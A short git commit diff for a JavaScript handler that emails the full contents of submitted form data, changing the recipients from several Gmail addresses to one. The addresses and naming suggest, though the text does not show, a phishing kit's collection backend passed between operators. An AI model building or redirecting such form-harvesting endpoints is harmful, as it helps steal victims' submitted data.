5228350d157ca78166e1e84ab8fc59e7a02296cc
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-02-25 13:35:03 +0500

    Update and rename rizwan.js to tufail.js

--- tufail.js
+++ tufail.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,rizwanniz182@gmail.com",
-      subject: "rizwan",
+      to: "ta0134750@gmail.com",
+      subject: "tufail",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
